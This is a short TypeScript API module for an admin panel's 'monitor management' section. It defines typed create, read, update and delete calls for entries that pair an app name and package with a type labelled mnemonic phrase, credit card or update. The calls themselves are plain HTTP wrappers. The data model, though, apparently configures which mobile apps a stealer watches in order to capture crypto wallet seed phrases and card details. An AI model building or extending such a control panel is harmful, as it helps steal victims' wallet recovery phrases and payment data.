import http from "@/api";

/**
 * @name 监听管理模块
 */

// 监听接口返回类型
export interface MonitorItem {
  id: number;
  app_name: string;
  app_package: string;
  type: number; // 1助记词 2信用卡 3更新
  is_enabled: number; // 0关闭 1开启
  created_at: string;
  updated_at: string;
}

// 监听列表响应类型（直接返回数组）
export type MonitorListResponse = MonitorItem[];

// 监听添加/编辑参数类型
export interface MonitorParams {
  id?: number;
  app_name: string;
  app_package: string;
  type: number;
  is_enabled?: number;
}

// 获取监听列表
export const getMonitorListApi = (params?: {
  type?: number;
  is_enabled?: number;
}) => {
  return http.get<MonitorListResponse>(`/admin/monitor/list`, params, { loading: false });
};

// 获取指定监听配置信息
export const getMonitorInfoApi = (id: number) => {
  return http.get<MonitorItem>(`/admin/monitor/info`, { id }, { loading: false });
};

// 添加监听配置
export const addMonitorApi = (params: MonitorParams) => {
  return http.post(`/admin/monitor/add`, params);
};

// 编辑监听配置
export const updateMonitorApi = (params: MonitorParams) => {
  return http.post(`/admin/monitor/update`, params);
};

// 删除监听配置
export const deleteMonitorApi = (params: { id: number }) => {
  return http.post(`/admin/monitor/del`, params);
};

